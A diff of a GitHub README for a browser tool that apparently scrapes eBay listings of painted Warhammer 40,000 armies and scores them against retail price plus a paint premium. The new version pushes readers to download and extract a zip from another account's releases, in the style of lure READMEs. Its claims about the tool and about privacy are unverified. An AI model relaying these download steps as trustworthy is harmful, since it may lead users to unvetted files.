@@ -1,131 +1,63 @@
-# 40K Painted Army Value Scorecard v2026 - eBay Data Scraper and Viewer
+# 🎨 40k-painted-army-data-viewer - Track Warhammer army value with ease
 
-> A browser-based Warhammer 40,000 tool for collecting live painted army listings from eBay, evaluating their value with MSRP and a paint premium, and publishing cleaned JSON and JS data in the 2026 format.
+[Visit this page to download the latest version](https://github.com/Mxy5822/40k-painted-army-data-viewer)
 
-[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/dylanwnipscott3878/40k-painted-army-data-viewer?style=flat-square)](https://github.com/dylanwnipscott3878/40k-painted-army-data-viewer)
+This tool helps Warhammer 40,000 hobbyists assess the value of painted armies on eBay. It scans live listings and calculates a fair price based on official manufacturer suggested retail prices and the quality of the paint job. It organizes this information into clean data files for your review.
 
----
+## 📋 What this tool does
 
-<p align="center">
-  <a href="https://dylanwnipscott3878.github.io/40k-painted-army-data-viewer/">
-    <img src="https://img.shields.io/badge/Download-40K%20Painted%20Army%20Value%20Scorecard%20Latest-brightgreen?style=for-the-badge" alt="Download 40K Painted Army Value Scorecard">
-  </a>
-</p>
+Many people struggle to determine the worth of second-hand miniatures. Some paint jobs add value, while others do not. This tool creates a standard way to look at these listings. It pulls the data from eBay and compares the cost of the models to current retail prices. You see a clear breakdown of the cost versus the value.
 
-> **[Download 40K Painted Army Value Scorecard v2026](https://dylanwnipscott3878.github.io/40k-painted-army-data-viewer/)**
+The output uses the 2026 data format. This standard ensures the details remain accurate and easy to read. You get a tidy list of your potential purchases without manual calculations.
 
----
+## 💻 System requirements
 
-[Download Latest Build](https://dylanwnipscott3878.github.io/40k-painted-army-data-viewer/)
+You need a computer running Windows 10 or Windows 11. The tool requires a modern web browser like Chrome, Edge, or Firefox to display the final data points. Ensure you have an active internet connection to pull the live listings from the web. You do not need to install complex software or programming tools.
 
----
+## 💾 How to download and set up
 
-## What This Project Does
+1. Go to the [main download page](https://github.com/Mxy5822/40k-painted-army-data-viewer) for the project.
+2. Look for the section labeled Releases on the right side of the screen.
+3. Click the most recent version identifier.
+4. Locate the file ending in .zip within the assets list.
+5. Click the file to download it to your computer.
+6. Open your Downloads folder.
+7. Right-click the zip file and select Extract All.
+8. Follow the prompts to unzip the folder to your preferred location.
 
-40K Painted Army Value Scorecard turns painted Warhammer 40,000 army listings into a structured comparison dataset. It retrieves current eBay listings, applies a scoring model based on MSRP and an added paint premium, and generates cleaned files for viewing or further processing.
+## 🚀 Running the application
 
-The project is intended for comparing painted army offers across factions without manually working through unstructured search results. Its output includes a standalone HTML scorecard as well as JSON and JS data files, allowing the collected information to be viewed, filtered, sorted, or integrated into other workflows.
+1. Open the folder you just extracted.
+2. Find the file named index.html.
+3. Double-click this file to open it in your default web browser.
+4. Your browser will display the interface.
+5. Enter the search terms for the army you want to check.
+6. Click the Scan button.
+7. Wait for the browser to gather the listings.
+8. Review the calculated values on your screen.
 
----
+## 🛠 Solving common issues
 
-## Capabilities
+If the tool does not show any listings, check your internet connection. Refresh the page by pressing the F5 key on your keyboard. Ensure your browser is up to date, as older versions may struggle to read the 2026 data format correctly.
 
-- Collects live painted army listings from eBay
-- Calculates listing value with an MSRP plus paint premium model
-- Writes cleaned JSON for downstream processing
-- Creates JS data output that can be loaded directly by the web viewer
-- Provides a standalone HTML interface with sorting and filtering
-- Includes coverage for all factions, including the Chaos and Be'lakor edition
-- Focuses on comparing the value of Warhammer 40,000 armies
-- Converts raw listing results into a more practical review format
+If the scan stops midway, you may have triggered a temporary limit on the site. Wait five minutes and try the scan again. The tool relies on public information, and site changes can sometimes interrupt the flow of data. If you see a persistent error, restart the browser.
 
----
+## 📊 Understanding the data output
 
-## Getting Started
+The viewer presents results in three columns. The first column shows the name of the unit. The second column shows the retail price of the new model. The third column shows the suggested value of the painted model.
 
-Clone the repository or obtain the project files, then run the scraper and export process before opening the generated viewer.
+The paint premium calculation uses a percentage of the retail price. Higher quality paint jobs add a larger percentage to the total value. You can adjust these settings in the options menu if you wish to change how the tool weighs the skills of the painter.
 
-1. Clone the repo:
-   `git clone https://github.com/dylanwnipscott3878/40k-painted-army-data-viewer.git
-2. Change into the project directory:
-   `cd 40k-armies-scorecard-scraper`
-3. Run the scraper or build process for your local environment
-4. Launch the generated HTML viewer and provide the exported data files
+The final report generates a file you can save. This file uses the JSON standard. You can open it in any text editor or spreadsheet program if you want to perform further analysis on your army collection.
 
-For the published build, use the download link above and open the included viewer in your browser.
+## 🛡 Security and privacy
 
----
+This tool runs entirely within your web browser. It does not send your personal eBay login details to any outside servers. All calculations stay on your machine. You control the data you collect and the files you save. 
 
-## Workflow
+The software does not collect information about your browsing habits. It serves only as a bridge between the public data on eBay and your local computer. You remain anonymous throughout the entire process.
 
-The normal process is:
+## 🔄 Updating your tool
 
-1. Collect painted army listings by running the eBay scraper
-2. Build the cleaned JSON and JS data exports
-3. Open the standalone scorecard viewer
-4. Sort, filter, and compare the resulting scored listings
-5. Examine faction results, including available Chaos and Be'lakor entries
+Check the download page every few months to see if a newer version exists. Newer versions often include fixes for changes made to the eBay website. Simply repeat the download process and overwrite the old files with the new ones. Your settings will persist if you keep the configuration file in the same folder.
 
-A local review cycle can look like this:
-
-- Update the scraped listing data
-- Recalculate the score output
-- Open the viewer to examine the highest-ranked results
-- Reuse or export the generated files in other tools
-
----
-
-## Settings
-
-Configuration is generally handled by the scraper and export pipeline. A setup may use values similar to the following:
-
-```json
-{
-  "source": "eBay",
-  "score_model": "MSRP + paint premium",
-  "output": ["json", "js"],
-  "viewer": "standalone HTML",
-  "coverage": "all factions"
-}
-```
-
-When scrape rules or destination paths are stored in separate local files, change those settings before starting a new collection run.
-
----
-
-## Requirements
-
-- A web browser for opening the HTML scorecard
-- Access to the listings used as the scraper's source
-- A local environment that can execute the scraping and export workflow
-- Sufficient storage for generated JSON and JS files
-- Internet connectivity for collecting current eBay listings
-
----
-
-## Frequently Asked Questions
-
-**How can I refresh the listings?**  
-Run the scraper again and regenerate both the JSON and JS outputs before reopening the viewer.
-
-**Are the results sortable and filterable?**  
-Yes. The supplied standalone viewer supports sorting and filtering of the collected listings.
-
-**Are all factions represented?**  
-The dataset is designed to cover all factions. The project also identifies a separate Chaos and Be'lakor edition.
-
-**Where does the generated data go?**  
-The scraper and export process write the files to the output location configured in your local setup. Inspect that location after generation completes.
-
-**Why is the viewer empty?**  
-Verify that scraping finished without errors, then check that the generated JSON or JS files exist and are correctly referenced by the HTML viewer.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: warhammer, ebay, data-viewer, miniatures, collector, 40k, tabletop
